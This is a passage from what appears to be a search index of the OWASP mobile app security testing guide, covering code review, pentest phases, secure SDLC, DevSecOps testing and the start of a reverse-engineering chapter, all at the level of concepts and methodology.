low-hanging fruit, and the human tester can explore the code base with specific usage contexts in mind.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#manual-code-review","title":"Manual Code Review","text":"<p>A tester performs manual code review by manually analyzing the mobile app's source code for security vulnerabilities. Methods range from a basic keyword search via the 'grep' command to a line-by-line examination of the source code. IDEs (Integrated Development Environments) often provide basic code review functions and can be extended with various tools.</p> <p>A common approach to manual code analysis entails identifying key security vulnerability indicators by searching for certain APIs and keywords, such as database-related method calls like \"executeStatement\" or \"executeQuery\". Code containing these strings is a good starting point for manual analysis.</p> <p>In contrast to automatic code analysis, manual code review is very good for identifying vulnerabilities in the business logic, standards violations, and design flaws, especially when the code is technically secure but logically flawed. Such scenarios are unlikely to be detected by any automatic code analysis tool.</p> <p>A manual code review requires an expert code reviewer who is proficient in both the language and the frameworks used for the mobile app. Full code review can be a slow, tedious, time-consuming process for the reviewer, especially given large code bases with many dependencies.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#automated-source-code-analysis","title":"Automated Source Code Analysis","text":"<p>Automated analysis tools can be used to speed up the review process of Static Application Security Testing (SAST). They check the source code for compliance with a predefined set of rules or industry best practices, then typically display a list of findings or warnings and flags for all detected violations. Some static analysis tools run against the compiled app only, some must be fed the original source code, and some run as live-analysis plugins in the Integrated Development Environment (IDE).</p> <p>Although some static code analysis tools incorporate a lot of information about the rules and semantics required to analyze mobile apps, they may produce many false positives, particularly if they are not configured for the target environment. A security professional must therefore always review the results.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The focus of DAST is the testing and evaluation of apps via their real-time execution. The main objective of dynamic analysis is finding security vulnerabilities or weak spots in a program while it is running. Dynamic analysis is conducted both at the mobile platform layer and against the backend services and APIs, where the mobile app's request and response patterns can be analyzed.</p> <p>Dynamic analysis is usually used to check for security mechanisms that provide sufficient protection against the most prevalent types of attack, such as disclosure of data in transit, authentication and authorization issues, and server configuration errors.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#avoiding-false-positives","title":"Avoiding False Positives","text":"","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#automated-scanning-tools","title":"Automated Scanning Tools","text":"<p>Automated testing tools' lack of sensitivity to app context is a challenge. These tools may identify a potential issue that's irrelevant. Such results are called \"false positives\".</p> <p>For example, security testers commonly report vulnerabilities that are exploitable in a web browser but aren't relevant to the mobile app. This false positive occurs because automated tools used to scan the backend service are based on regular browser-based web apps. Issues such as CSRF (Cross-site Request Forgery) and Cross-Site Scripting (XSS) are reported accordingly.</p> <p>Let's take CSRF as an example. A successful CSRF attack requires the following:</p> <ul> <li>The ability to entice the logged-in user to open a malicious link in the web browser used to access the vulnerable site.</li> <li>The client (browser) must automatically add the session cookie or other authentication token to the request.</li> </ul> <p>Mobile apps don't fulfill these requirements: even if WebViews and cookie-based session management are used, any malicious link the user clicks opens in the default browser, which has a separate cookie store.</p> <p>Stored Cross-Site Scripting (XSS) can be an issue if the app includes WebViews, and it may even lead to command execution if the app exports JavaScript interfaces. However, reflected Cross-Site Scripting is rarely an issue for the reason mentioned above (even though whether they should exist at all is arguable, escaping output is simply a best practice).</p> <p>In any case, consider exploit scenarios when you perform the risk assessment; don't blindly trust your scanning tool's output.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#penetration-testing-aka-pentesting","title":"Penetration Testing (a.k.a. Pentesting)","text":"<p>The classic approach involves all-around security testing of the app's final or near-final build, e.g., the build that's available at the end of the development process. For testing at the end of the development process, we recommend the Mobile App Security Verification Standard (MASVS) and the associated checklist as baseline for testing. A typical security test is structured as follows:</p> <ul> <li>Preparation - defining the scope of security testing, including identifying applicable security controls, the organization's testing goals, and sensitive data. More generally, preparation includes all synchronization with the client as well as legally protecting the tester (who is often a third party). Remember, attacking a system without written authorization is illegal in many parts of the world!</li> <li>Intelligence Gathering - analyzing the environmental and architectural context of the app to gain a general contextual understanding.</li> <li>Mapping the Application - based on information from the previous phases; may be complemented by automated scanning and manually exploring the app. Mapping provides a thorough understanding of the app, its entry points, the data it holds, and the main potential vulnerabilities. These vulnerabilities can then be ranked according to the damage their exploitation would cause so that the security tester can prioritize them. This phase includes the creation of test cases that may be used during test execution.</li> <li>Exploitation - in this phase, the security tester tries to penetrate the app by exploiting the vulnerabilities identified during the previous phase. This phase is necessary for determining whether vulnerabilities are real and true positives.</li> <li>Reporting - in this phase, which is essential to the client, the security tester reports the vulnerabilities. This includes the exploitation process in detail, classifies the type of vulnerability, documents the risk if an attacker would be able to compromise the target and outlines which data the tester has been able to access illegitimately.</li> </ul>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#preparation","title":"Preparation","text":"<p>The security level at which the app will be tested must be decided before testing. The security requirements should be decided at the beginning of the project. Different organizations have different security needs and resources available for investing in test activities. Although the tests in the MAS-L1 profile are applicable to all mobile apps, walking through the entire MAS-L1 and MAS-L2 tests with technical and business stakeholders is a good way to decide on a level of test coverage.</p> <p>Organizations may have different regulatory and legal obligations in certain territories. Even if an app doesn't handle sensitive data, some MAS-L2 tests may be relevant (because of industry regulations or local laws). For example, two-factor authentication (2FA) may be obligatory for a financial app and enforced by a country's central bank and/or financial regulatory authorities.</p> <p>Security goals/controls defined earlier in the development process may also be reviewed during the discussion with stakeholders. Some controls may conform to MAS profiles, but others may be specific to the organization or app.</p> <p>All involved parties must agree on the decisions and the scope in the checklist because these will define the baseline for all security testing.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#coordinating-with-the-client","title":"Coordinating with the Client","text":"<p>Setting up a working test environment can be a challenging task. For example, restrictions on the enterprise wireless access points and networks may impede dynamic analysis performed at client premises. Company policies may prohibit the use of rooted phones or (hardware and software) network testing tools within enterprise networks. Apps that implement root detection and other reverse engineering countermeasures may significantly increase the work required for further analysis.</p> <p>Security testing involves many invasive tasks, including monitoring and manipulating the mobile app's network traffic, inspecting the app data files, and instrumenting API calls. Security controls, such as certificate pinning and root detection, may impede these tasks and dramatically slow testing down.</p> <p>To overcome these obstacles, you may want to request two of the app's build variants from the development team. One variant should be a release build so that you can determine whether the implemented controls are working properly and can't be bypassed easily. The second variant should be a debug build for which certain security controls have been deactivated. Testing two different builds is the most efficient way to cover all test cases.</p> <p>Depending on the scope of the engagement, this approach may not be possible. Requesting both production and debug builds for a white-box test will help you complete all test cases and clearly state the app's security maturity. The client may prefer that black-box tests be focused on the production app and the evaluation of its security controls' effectiveness.</p> <p>The scope of both types of testing should be discussed during the preparation phase. For example, whether the security controls should be adjusted should be decided before testing. Additional topics are discussed below.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#identifying-sensitive-data","title":"Identifying Sensitive Data","text":"<p>Classifications of sensitive information differ by industry and country. In addition, organizations may take a restrictive view of sensitive data, and they may have a data classification policy that clearly defines sensitive information.</p> <p>There are three general states from which data may be accessible:</p> <ul> <li>At rest - the data is sitting in a file or data store</li> <li>In use - an app has loaded the data into its address space</li> <li>In transit - data has been exchanged between mobile app and endpoint or consuming processes on the device, e.g., during IPC (Inter-Process Communication)</li> </ul> <p>The degree of scrutiny that's appropriate for each state may depend on the data's importance and likelihood of being accessed. For example, data held in app memory may be more vulnerable than data on web servers to access via core dumps because attackers are more likely to gain physical access to mobile devices than to web servers.</p> <p>When no data classification policy is available, use the following list of information that's generally considered sensitive:</p> <ul> <li>user authentication information (credentials, PINs, etc.)</li> <li>Personally Identifiable Information (PII) that can be abused for identity theft: social security numbers, credit card numbers, bank account numbers, health information</li> <li>device identifiers that may identify a person</li> <li>highly sensitive data whose compromise would lead to reputational harm and/or financial costs</li> <li>any data whose protection is a legal obligation</li> <li>any technical data generated by the app (or its related systems) and used to protect other data or the system itself (e.g., encryption keys)</li> </ul> <p>A definition of \"sensitive data\" must be decided before testing begins because detecting sensitive data leakage without a definition may be impossible.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#identifying-security-relevant-contexts-in-code","title":"Identifying Security-Relevant Contexts in Code","text":"<p>When developing a mobile application, it's crucial to accurately identify and handle security-relevant contexts within the codebase. These contexts typically involve operations such as authentication, encryption, and authorization, which are often the target of security attacks. Incorrect implementation of cryptographic functions in these areas can lead to significant security vulnerabilities.</p> <p>Properly distinguishing security-relevant contexts helps in minimizing false positives during security testing. False positives can divert attention from real issues and waste valuable resources. Here are some common scenarios:</p> <ul> <li> <p>Random Number Generation: Using predictable random number generators can be a serious security flaw in contexts like authentication or encryption key generation. However, not all uses of random numbers are security-sensitive. For instance, using a less robust random number generator for non-security purposes like shuffling a list of items in a game is generally acceptable.</p> </li> <li> <p>Hashing: Hashing is often used in security for storing passwords or ensuring data integrity. However, hashing a non-sensitive value, like a device's screen resolution for analytics, isn't a security concern.</p> </li> <li> <p>Encryption vs Encoding: A common misunderstanding is conflating encoding (like Base64) with encryption. Base64 encoding is not a secure method for protecting sensitive data as it's easily reversible. It's crucial to recognize when data requires actual encryption (for confidentiality) versus when it's being encoded for compatibility or formatting reasons (like encoding binary data into a text format for transmission). Misinterpreting encoding as a security measure can lead to overlooking actual encryption needs for sensitive data.</p> </li> <li> <p>API Token Storage: Storing API tokens or keys in plain text within the app's code or in insecure locations (like SharedPreferences on Android or UserDefaults on iOS) is a common security mistake. However, if the token is for a non-sensitive, read-only public API, this might not be a security risk. Contrast this with storing a token for a sensitive or write-access API, where improper storage would be a significant security concern.</p> </li> </ul>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#intelligence-gathering","title":"Intelligence Gathering","text":"<p>Intelligence gathering involves the collection of information about the app's architecture, the business use cases the app serves, and the context in which the app operates. Such information may be classified as \"environmental\" or \"architectural\".</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#environmental-information","title":"Environmental Information","text":"<p>Environmental information includes:</p> <ul> <li>The organization's goals for the app. Functionality shapes users' interaction with the app and may make some surfaces more likely than others to be targeted by attackers.</li> <li>The relevant industry. Different industries may have different risk profiles.</li> <li>Stakeholders and investors; understanding who is interested in and responsible for the app.</li> <li>Internal processes, workflows, and organizational structures. Organization-specific internal processes and workflows may create opportunities for business logic vulnerabilities.</li> </ul>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#architectural-information","title":"Architectural Information","text":"<p>Architectural information includes:</p> <ul> <li>The mobile app: How the app accesses data and manages it in-process, how it communicates with other resources and manages user sessions, and whether it detects itself running on jailbroken or rooted phones and reacts to these situations.</li> <li>The Operating System: The operating systems and OS versions the app runs on (including Android or iOS version restrictions), whether the app is expected to run on devices that have Mobile Device Management (MDM) controls, and relevant OS vulnerabilities.</li> <li>Network: Usage of secure transport protocols (e.g., TLS), usage of strong keys and cryptographic algorithms (e.g., SHA-2) to secure network traffic encryption, usage of certificate pinning to verify the endpoint, etc.</li> <li>Remote Services: The remote services the app consumes and whether their being compromised could compromise the client.</li> </ul>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#mapping-the-application","title":"Mapping the Application","text":"<p>Once the security tester has information about the app and its context, the next step is mapping the app's structure and content, e.g., identifying its entry points, features, and data.</p> <p>When penetration testing is performed in a white-box or grey-box paradigm, any documents from the interior of the project (architecture diagrams, functional specifications, code, etc.) may greatly facilitate the process. If source code is available, the use of SAST tools can reveal valuable information about vulnerabilities (e.g., SQL Injection). DAST tools may support black-box testing and automatically scan the app: whereas a tester will need hours or days, a scanner may perform the same task in a few minutes. However, it's important to remember that automatic tools have limitations and will only find what they have been programmed to find. Therefore, human analysis may be necessary to augment results from automatic tools (intuition is often key to security testing).</p> <p>Threat Modeling is an important artifact: documents from the workshop usually greatly support the identification of much of the information a security tester needs (entry points, assets, vulnerabilities, severity, etc.). Testers are strongly advised to discuss the availability of such documents with the client. Threat modeling should be a key part of the software development life cycle. It usually occurs in the early phases of a project.</p> <p>The threat modeling guidelines defined in OWASP are generally applicable to mobile apps.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#exploitation","title":"Exploitation","text":"<p>Unfortunately, time or financial constraints limit many pentests to application mapping via automated scanners (for vulnerability analysis, for example). Although vulnerabilities identified during the previous phase may be interesting, their relevance must be confirmed with respect to five axes:</p> <ul> <li>Damage potential - the damage that can result from exploiting the vulnerability</li> <li>Reproducibility - ease of reproducing the attack</li> <li>Exploitability - ease of executing the attack</li> <li>Affected users - the number of users affected by the attack</li> <li>Discoverability - ease of discovering the vulnerability</li> </ul> <p>Against all odds, some vulnerabilities may not be exploitable and may lead to minor compromises, if any. Other vulnerabilities may seem harmless at first sight, yet be determined very dangerous under realistic test conditions. Testers who carefully go through the exploitation phase support pentesting by characterizing vulnerabilities and their effects.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#reporting","title":"Reporting","text":"<p>The security tester's findings will be valuable to the client only if they are clearly documented. A good pentest report should include information such as, but not limited to, the following:</p> <ul> <li>an executive summary</li> <li>a description of the scope and context (e.g., targeted systems)</li> <li>methods used</li> <li>sources of information (either provided by the client or discovered during the pentest)</li> <li>prioritized findings (e.g., vulnerabilities that have been structured by DREAD classification)</li> <li>detailed findings</li> <li>recommendations for fixing each defect</li> </ul> <p>Many pentest report templates are available on the Internet: Google is your friend!</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#security-testing-and-the-sdlc","title":"Security Testing and the SDLC","text":"<p>Although the principles of security testing haven't fundamentally changed in recent history, software development techniques have changed dramatically. While the widespread adoption of Agile practices was speeding up software development, security testers had to become quicker and more agile while continuing to deliver trustworthy software.</p> <p>The following section is focused on this evolution and describes contemporary security testing.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#security-testing-during-the-software-development-life-cycle","title":"Security Testing during the Software Development Life Cycle","text":"<p>Software development is not very old, after all, so the end of developing without a framework is easy to observe. We have all experienced the need for a minimal set of rules to control work as the source code grows.</p> <p>In the past, \"Waterfall\" methodologies were the most widely adopted: development proceeded by steps that had a predefined sequence. Limited to a single step, backtracking capability was a serious drawback of Waterfall methodologies. Although they have important positive features (providing structure, helping testers clarify where effort is needed, being clear and easy to understand, etc.), they also have negative ones (creating silos, being slow, specialized teams, etc.).</p> <p>As software development matured, competition increased and developers needed to react to market changes more quickly while creating software products with smaller budgets. The idea of less structure became popular, and smaller teams collaborated, breaking silos throughout the organization. The \"Agile\" concept was born (Scrum, XP, and RAD are well-known examples of Agile implementations); it enabled more autonomous teams to work together more quickly.</p> <p>Security wasn't originally an integral part of software development. It was an afterthought, performed at the network level by operation teams who had to compensate for poor software security! Although unintegrated security was possible when software programs were located inside a perimeter, the concept became obsolete as new kinds of software consumption emerged with web, mobile, and IoT technologies. Nowadays, security must be baked inside software because compensating for vulnerabilities is often very difficult.</p> <p>\"SDLC\" will be used interchangeably with \"Secure SDLC\" in the following section to help you internalize the idea that security is a part of software development processes. In the same spirit, we use the name DevSecOps to emphasize the fact that security is part of DevOps.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#sdlc-overview","title":"SDLC Overview","text":"","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#general-description-of-sdlc","title":"General Description of SDLC","text":"<p>SDLCs always consist of the same steps (the overall process is sequential in the Waterfall paradigm and iterative in the Agile paradigm):</p> <ul> <li>Perform a risk assessment for the app and its components to identify their risk profiles. These risk profiles typically depend on the organization's risk appetite and applicable regulatory requirements. The risk assessment is also based on factors, including whether the app is accessible via the Internet and the kind of data the app processes and stores. All kinds of risks must be taken into account: financial, marketing, industrial, etc. Data classification policies specify which data is sensitive and how it must be secured.</li> <li>Security Requirements are determined at the beginning of a project or development cycle, when functional requirements are being gathered. Abuse Cases are added as use cases are created. Teams (including development teams) may be given security training (such as Secure Coding) if they need it. You can use the OWASP MASVS and OWASP MASVS to determine the security requirements of mobile apps on the basis of the risk assessment phase. Iteratively reviewing requirements when features and data classes are added is common, especially with Agile projects.</li> <li>Threat Modeling, which is basically the identification, enumeration, prioritization, and initial handling of threats, is a foundational artifact that must be performed as architecture development and design progress. Security Architecture, a Threat Model factor, can be refined (for both software and hardware aspects) after the Threat Modeling phase. Secure Coding rules are established and the list of Security tools that will be used is created. The strategy for Security testing is clarified.</li> <li>All security requirements and design considerations should be stored in the Application Life Cycle Management (ALM) system (also known as the issue tracker) that the development/ops team uses to ensure tight integration of security requirements into the development workflow. The security requirements should contain relevant source code snippets so that developers can quickly reference the snippets. Creating a dedicated repository that's under version control and contains only these code snippets is a secure coding strategy that's more beneficial than the traditional approach (storing the guidelines in word documents or PDFs).</li> <li>Securely develop the software. To increase code security, you must complete activities such as Security Code Reviews, Static Application Security Testing, and Security Unit Testing. Although quality analogues of these security activities exist, the same logic must be applied to security, e.g., reviewing, analyzing, and testing code for security defects (for example, missing input validation, failing to free all resources, etc.).</li> <li>Next comes the long-awaited release candidate testing: both manual and automated Penetration Testing (\"Pentests\"). Dynamic Application Security Testing is usually performed during this phase as well.</li> <li>After the software has been Accredited during Acceptance by all stakeholders, it can be safely transitioned to Operation teams and put in Production.</li> <li>The last phase, too often neglected, is the safe Decommissioning of software after its end of use.</li> </ul> <p>The picture below illustrates all the phases and artifacts:</p> <p></p> <p>Based on the project's general risk profile, you may simplify (or even skip) some artifacts, and you may add others (formal intermediary approvals, formal documentation of certain points, etc.). Always remember two things: an SDLC is meant to reduce risks associated with software development, and it is a framework that helps you set up controls to that end. This is a generic description of SDLC; always tailor this framework to your projects.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#defining-a-test-strategy","title":"Defining a Test Strategy","text":"<p>Test strategies specify the tests that will be performed during the SDLC as well as testing frequency. Test strategies are used to make sure that the final software product meets security objectives, which are generally determined by clients' legal/marketing/corporate teams. The test strategy is usually created during the Secure Design phase, after risks have been clarified (during the Initiation phase) and before code development (the Secure Implementation phase) begins. The strategy requires input from activities such as Risk Management, previous Threat Modeling, and Security Engineering.</p> <p>A Test Strategy needn't be formally written: it may be described through Stories (in Agile projects), quickly enumerated in checklists, or specified as test cases for a given tool. However, the strategy must definitely be shared because it must be implemented by a team other than the team who defined it. Moreover, all technical teams must agree to it to ensure that it doesn't place unacceptable burdens on any of them.</p> <p>Test Strategies address topics such as the following:</p> <ul> <li>objectives and risk descriptions</li> <li>plans for meeting objectives, risk reduction, which tests will be mandatory, who will perform them, how and when they will be performed</li> <li>acceptance criteria</li> </ul> <p>To track the testing strategy's progress and effectiveness, metrics should be defined, continually updated during the project, and periodically communicated. An entire book could be written about choosing relevant metrics; the most we can say here is that they depend on risk profiles, projects, and organizations. Examples of metrics include the following:</p> <ul> <li>the number of stories related to security controls that have been successfully implemented</li> <li>code coverage for unit tests of security controls and sensitive features</li> <li>the number of security bugs found for each build via static analysis tools</li> <li>trends in security bug backlogs (which may be sorted by urgency)</li> </ul> <p>These are only suggestions; other metrics may be more relevant to your project. Metrics are powerful tools for getting a project under control, provided they give project managers a clear and synthetic perspective on what is happening and what needs to be improved.</p> <p>Distinguishing between tests performed by an internal team and tests performed by an independent third party is important. Internal tests are usually useful for improving daily operations, while third-party tests are more beneficial to the whole organization. Internal tests can be performed quite often, but third-party testing happens at most once or twice a year; also, the former are less expensive than the latter. Both are necessary, and many regulations mandate tests from an independent third party because such tests can be more trustworthy.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#security-testing-in-waterfall","title":"Security Testing in Waterfall","text":"","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#what-waterfall-is-and-how-testing-activities-are-arranged","title":"What Waterfall Is and How Testing Activities Are Arranged","text":"<p>Basically, SDLC doesn't mandate the use of any development life cycle: it is safe to say that security can (and must!) be addressed in any situation.</p> <p>Waterfall methodologies were popular before the 21st century. The most famous application is called the \"V model\", in which phases are performed in sequence and you can backtrack only a single step. The testing activities of this model occur in sequence and are performed as a whole, mostly at the point in the life cycle when most of the app development is complete. This activity sequence means that changing the architecture and other factors that were set up at the beginning of the project is hardly possible even though code may be changed after defects have been identified.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#security-testing-for-agiledevops-and-devsecops","title":"Security Testing for Agile/DevOps and DevSecOps","text":"<p>DevOps refers to practices that focus on a close collaboration between all stakeholders involved in software development (generally called Devs) and operations (generally called Ops). DevOps is not about merging Devs and Ops. Development and operations teams originally worked in silos, when pushing developed software to production could take a significant amount of time. When development teams made moving more deliveries to production necessary by working with Agile, operation teams had to speed up to match the pace. DevOps is the necessary evolution of the solution to that challenge in that it allows software to be released to users more quickly. This is largely accomplished via extensive build automation, the process of testing and releasing software, and infrastructure changes (in addition to the collaboration aspect of DevOps). This automation is embodied in the deployment pipeline with the concepts of Continuous Integration and Continuous Delivery (CI/CD).</p> <p>People may assume that the term \"DevOps\" represents collaboration between development and operations teams only, however, as DevOps thought leader Gene Kim puts it: \"At first blush, it seems as though the problems are just between Devs and Ops, but test is in there, and you have information security objectives, and the need to protect systems and data. These are top-level concerns of management, and they have become part of the DevOps picture.\"</p> <p>In other words, DevOps collaboration includes quality teams, security teams, and many other teams related to the project. When you hear \"DevOps\" today, you should probably be thinking of something like DevOpsQATestInfoSec. Indeed, DevOps values pertain to increasing not only speed but also quality, security, reliability, stability, and resilience.</p> <p>Security is just as critical to business success as the overall quality, performance, and usability of an app. As development cycles are shortened and delivery frequencies increased, making sure that quality and security are built in from the very beginning becomes essential. DevSecOps is all about adding security to DevOps processes. Most defects are identified during production. DevOps specifies best practices for identifying as many defects as possible early in the life cycle and for minimizing the number of defects in the released app.</p> <p>However, DevSecOps is not just a linear process oriented towards delivering the best possible software to operations; it is also a mandate that operations closely monitor software that's in production to identify issues and fix them by forming a quick and efficient feedback loop with development. DevSecOps is a process through which Continuous Improvement is heavily emphasized.</p> <p></p> <p>The human aspect of this emphasis is reflected in the creation of cross-functional teams that work together to achieve business outcomes. This section is focused on necessary interactions and integrating security into the development life cycle (which starts with project inception and ends with the delivery of value to users).</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#what-agile-and-devsecops-are-and-how-testing-activities-are-arranged","title":"What Agile and DevSecOps Are and How Testing Activities Are Arranged","text":"","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#overview","title":"Overview","text":"<p>Automation is a key DevSecOps practice: as stated earlier, the frequency of deliveries from development to operation increases when compared to the traditional approach, and activities that usually require time need to keep up, e.g. deliver the same added value while taking less time. Unproductive activities must consequently be abandoned, and essential tasks must be fastened. These changes impact infrastructure changes, deployment, and security:</p> <ul> <li>infrastructure is being implemented as Infrastructure as Code</li> <li>deployment is becoming more scripted, translated through the concepts of Continuous Integration and Continuous Delivery</li> <li>security activities are being automated as much as possible and taking place throughout the life cycle</li> </ul> <p>The following sections provide more details about these three points.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#infrastructure-as-code","title":"Infrastructure as Code","text":"<p>Instead of manually provisioning computing resources (physical servers, virtual machines, etc.) and modifying configuration files, Infrastructure as Code is based on the use of tools and automation to fasten the provisioning process and make it more reliable and repeatable. Corresponding scripts are often stored under version control to facilitate sharing and issue resolution.</p> <p>Infrastructure as Code practices facilitate collaboration between development and operations teams, with the following results:</p> <ul> <li>Devs better understand infrastructure from a familiar point of view and can prepare resources that the running app will require.</li> <li>Ops operate an environment that better suits the app, and they share a language with Devs.</li> </ul> <p>Infrastructure as Code also facilitates the construction of the environments required by classical software creation projects, for development (\"DEV\"), integration (\"INT\"), testing (\"PPR\" for Pre-Production. Some tests are usually performed in earlier environments, and PPR tests mostly pertain to non-regression and performance with data that's similar to data used in production), and production (\"PRD\"). The value of infrastructure as code lies in the possible similarity between environments (they should be the same).</p> <p>Infrastructure as Code is commonly used for projects that have Cloud-based resources because many vendors provide APIs that can be used for provisioning items (such as virtual machines, storage spaces, etc.) and working on configurations (e.g., modifying memory sizes or the number of CPUs used by virtual machines). These APIs provide alternatives to administrators' performing these activities from monitoring consoles.</p> <p>The main tools in this domain are Puppet, Terraform, Packer, Chef and Ansible.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#deployment","title":"Deployment","text":"<p>The deployment pipeline's sophistication depends on the maturity of the project organization or development team. In its simplest form, the deployment pipeline consists of a commit phase. The commit phase usually involves running simple compiler checks and the unit test suite as well as creating a deployable artifact of the app. A release candidate is the latest version that has been checked into the trunk of the version control system. Release candidates are evaluated by the deployment pipeline for conformity to standards they must fulfill for deployment to production.</p> <p>The commit phase is designed to provide instant feedback to developers and is therefore run on every commit to the trunk. Time constraints exist because of this frequency. The commit phase should usually be complete within five minutes, and it shouldn't take longer than ten. Adhering to this time constraint is quite challenging when it comes to security because many security tools can't be run quickly enough (#paul, #mcgraw).</p> <p>CI/CD means \"Continuous Integration/Continuous Delivery\" in some contexts and \"Continuous Integration/Continuous Deployment\" in others. Actually, the logic is:</p> <ul> <li>Continuous Integration build actions (either triggered by a commit or performed regularly) use all source code to build a candidate release. Tests can then be performed and the release's compliance with security, quality, etc., rules can be checked. If case compliance is confirmed, the process can continue; otherwise, the development team must remediate the issue(s) and propose changes.</li> <li>Continuous Delivery candidate releases can proceed to the pre-production environment. If the release can then be validated (either manually or automatically), deployment can continue. If not, the project team will be notified and proper action(s) must be taken.</li> <li>Continuous Deployment releases are directly transitioned from integration to production, e.g., they become accessible to the user. However, no release should go to production if significant defects have been identified during previous activities.</li> </ul> <p>The delivery and deployment of apps with low or medium sensitivity may be merged into a single step, and validation may be performed after delivery. However, keeping these two actions separate and using strong validation are strongly advised for sensitive apps.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#security","title":"Security","text":"<p>At this point, the big question is: now that other activities required for delivering code are completed significantly faster and more effectively, how can security keep up? How can we maintain an appropriate level of security? Delivering value to users more often with decreased security would definitely not be good!</p> <p>Once again, the answer is automation and tooling: by implementing these two concepts throughout the project life cycle, you can maintain and improve security. The higher the expected level of security, the more controls, checkpoints, and emphasis will take place. The following are examples:</p> <ul> <li>Static Application Security Testing can take place during the development phase, and it can be integrated into the Continuous Integration process with more or less emphasis on scan results. You can establish more or less demanding Secure Coding Rules and use SAST tools to check the effectiveness of their implementation.</li> <li>Dynamic Application Security Testing may be automatically performed after the app has been built (e.g., after Continuous Integration has taken place) and before delivery, again, with more or less emphasis on results.</li> <li>You can add manual validation checkpoints between consecutive phases, for example, between delivery and deployment.</li> </ul> <p>The security of an app developed with DevOps must be considered during operations. The following are examples:</p> <ul> <li>Scanning should take place regularly (at both the infrastructure and application level).</li> <li>Pentesting may take place regularly. (The version of the app used in production is the version that should be pentested, and the testing should take place in a dedicated environment and include data that's similar to the production version data. See the section on Penetration Testing for more details.)</li> <li>Active monitoring should be performed to identify issues and remediate them as soon as possible via the feedback loop.</li> </ul> <p></p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#references","title":"References","text":"<ul> <li>[paul] - M. Paul. Official (ISC)2 Guide to the CSSLP CBK, Second Edition ((ISC)2 Press), 2014</li> <li>[mcgraw] - G McGraw. Software Security: Building Security In, 2006</li> </ul>","tags":[]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/","title":"Mobile App Tampering and Reverse Engineering","text":"<p>Reverse engineering and tampering techniques have long belonged to the realm of crackers, modders, malware analysts, etc. For \"traditional\" security testers and researchers, reverse engineering has been more of a complementary skill. But the tides are turning: mobile app black-box testing increasingly requires disassembling compiled apps, applying patches, and tampering with binary code or even live processes. The fact that many mobile apps implement defenses against unwelcome tampering doesn't make things easier for security testers.</p> <p>Reverse engineering a mobile app is the process of analyzing the compiled app to extract information about its source code. The goal of reverse engineering is comprehending the code.</p> <p>Tampering is the process of changing a mobile app (either the compiled app or the running process) or its environment to affect its behavior. For example, an app might refuse to run on your rooted test device, making it impossible to run some of your tests. In such cases, you'll want to alter the app's behavior.</p> <p>Mobile security testers are served well by understanding basic reverse engineering concepts. They should also know mobile devices and operating systems inside out: processor architecture, executable format, programming language intricacies, and so forth.</p> <p>Reverse engineering is an art, and describing its every facet would fill a whole library. The sheer range of techniques and specializations is mind-blowing: one can spend years working on a very specific and isolated sub-problem, such as automating malware analysis or developing novel de-obfuscation methods. Security testers are generalists; to be effective reverse engineers, they must filter through the vast amount of relevant information.</p> <p>There is no generic reverse engineering process that always works. That said, we'll describe commonly used methods and tools later in this guide, and give examples of tackling the most common defenses.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#why-you-need-it","title":"Why You Need It","text":"<p>Mobile security testing requires at least basic reverse engineering skills for several reasons:</p> <p>1. To enable black-box testing of mobile apps. Modern apps often include controls that will hinder dynamic analysis. SSL pinning and end-to-end (E2E) encryption sometimes prevent you from intercepting or manipulating traffic with a proxy. Root detection could prevent the app from running on a rooted device, preventing you from using advanced testing tools. You must be able to deactivate these defenses.</p> <p>2. To enhance static analysis in black-box security testing. In a black-box test, static analysis of the app bytecode or binary code helps you understand the internal logic of the app. It also allows you to identify flaws such as hardcoded credentials.</p> <p>3. To assess resilience against reverse engineering. Apps that implement the software protection measures listed in the Mobile Application Security Verification Standard Anti-Reversing Controls (MASVS-R) should withstand reverse engineering to a certain degree. To verify the effectiveness of such controls, the tester may perform a resilience assessment as part of the general security test. For the resilience assessment, the tester assumes the role of the reverse engineer and attempts to bypass defenses.</p> <p>Before we dive into the world of mobile app reversing, we have some good news and some bad news. Let's start with the good news:</p> <p>Ultimately, the reverse engineer always wins.</p> <p>This is particularly true in the mobile industry, where the reverse engineer has a natural advantage: the way mobile apps are deployed and sandboxed is by design more restrictive than the deployment and sandboxing of classical Desktop apps, so including the 